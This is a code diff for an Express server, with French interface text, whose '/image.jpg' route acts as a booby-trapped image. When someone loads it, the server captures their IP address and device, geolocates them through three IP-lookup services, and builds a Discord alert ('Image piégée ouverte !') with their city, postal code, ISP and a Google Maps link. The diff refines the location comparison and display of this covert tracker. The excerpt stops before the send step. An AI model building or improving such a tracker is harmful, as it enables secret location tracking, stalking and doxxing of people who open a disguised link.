@@ -37,12 +37,18 @@ let lookup;
   lookup = await maxmind.open('./GeoLite2-City.mmdb');
 })();
 
-function compareFields(values) {
-  // values = [bigData, ipinfo, maxmind]
-  const cleaned = values.filter(v => v && v !== 'undefined');
-  if (cleaned.length === 0) return '❌ Introuvable';
-  if (cleaned.length === 1) return cleaned[0];
-  return cleaned.join(' / ');
+function compareFields(label, ...values) {
+  const clean = values.filter(v => v && v !== 'undefined');
+  const unique = [...new Set(clean.map(v => v.toLowerCase?.() || v))];
+  const emoji = unique.length === 1 ? '✅' : '⚠️';
+  return `**${label} :** ${clean.join(' / ') || '❌ Introuvable'} ${emoji}`;
+}
+
+function getBestCoord(...coords) {
+  for (let c of coords) {
+    if (c && c.includes(',')) return c;
+  }
+  return null;
 }
 
 app.get('/image.jpg', async (req, res) => {
@@ -54,42 +60,46 @@ app.get('/image.jpg', async (req, res) => {
   const userAgent = req.headers['user-agent'];
   const device = deviceDetector.parse(userAgent);
 
-  let geo = {};
-  let ipinfo = {};
-  let bigdata = {};
+  let geo = {}, ipinfo = {}, bigdata = {};
 
   try {
     geo = lookup.get(ip) || {};
-  } catch (e) {}
+  } catch {}
 
   try {
-    const response = await axios.get(`https://ipinfo.io/${ip}?token=${IPINFO_TOKEN}`);
-    ipinfo = response.data || {};
-  } catch (e) {}
+    const { data } = await axios.get(`https://ipinfo.io/${ip}?token=${IPINFO_TOKEN}`);
+    ipinfo = data;
+  } catch {}
 
   try {
-    const response = await axios.get(`https://api.bigdatacloud.net/data/ip-geolocation?ip=${ip}&localityLanguage=fr&key=${BDC_TOKEN}`);
-    bigdata = response.data || {};
-  } catch (e) {}
+    const { data } = await axios.get(`https://api.bigdatacloud.net/data/ip-geolocation?ip=${ip}&localityLanguage=fr&key=${BDC_TOKEN}`);
+    bigdata = data;
+  } catch {}
 
   const coordsMaxMind = geo?.location ? `${geo.location.latitude},${geo.location.longitude}` : null;
-  const coordsBigData = bigdata.location ? `${bigdata.location.latitude},${bigdata.location.longitude}` : null;
+  const coordsBigData = bigdata?.location ? `${bigdata.location.latitude},${bigdata.location.longitude}` : null;
+  const coordsIpinfo = ipinfo?.loc || null;
+
+  const bestCoords = getBestCoord(coordsBigData, coordsIpinfo, coordsMaxMind);
+  const coordsField = bestCoords
+    ? `[${bestCoords}](https://maps.google.com/?q=${bestCoords})`
+    : '❌ Introuvable';
 
   const embed = new EmbedBuilder()
     .setTitle("📸 Image piégée ouverte !")
     .setDescription(`**IP :** ${ip}\n**Appareil :** ${device.client?.name || 'Inconnu'} - ${device.os?.name || 'Inconnu'}`)
     .setColor(0xff6600)
     .addFields(
-      { name: "🌍 Localisation", value: `
-**Pays :** ${compareFields([bigdata.country?.name, ipinfo.country, geo?.country?.names?.fr])}
-**Région :** ${compareFields([bigdata.principalSubdivision, ipinfo.region, geo?.subdivisions?.[0]?.names?.fr])}
-**Ville :** ${compareFields([bigdata.city?.name, ipinfo.city, geo?.city?.names?.fr])}
-**Code postal :** ${compareFields([bigdata.postcode, ipinfo.postal, geo?.postal?.code])}
-**Coordonnées :** ${compareFields([coordsBigData, ipinfo.loc, coordsMaxMind])}
-**FAI :** ${compareFields([ipinfo.org, geo?.traits?.isp])}
-`.trim() }
+      { name: "🌍 Localisation", value: [
+        compareFields("Pays", bigdata.country?.name, ipinfo.country, geo?.country?.names?.fr),
+        compareFields("Région", bigdata.principalSubdivision, ipinfo.region, geo?.subdivisions?.[0]?.names?.fr),
+        compareFields("Ville", bigdata.city?.name, ipinfo.city, geo?.city?.names?.fr),
+        compareFields("Code postal", bigdata.postcode, ipinfo.postal, geo?.postal?.code),
+        `**Coordonnées :** ${coordsField} ${coordsBigData && coordsIpinfo && coordsMaxMind ? '⚠️' : '✅'}`,
+        compareFields("FAI", ipinfo.org, geo?.traits?.isp)
+      ].join('\n') }
     )
-    .setFooter({ text: "🔍 Tracker Automatique Boosté", iconURL: "https://cdn-icons-png.flaticon.com/512/3524/3524393.png" })
+    .setFooter({ text: "🔍 Tracker avancé", iconURL: "https://cdn-icons-png.flaticon.com/512/3524/3524393.png" })
     .setTimestamp();
 
   try {
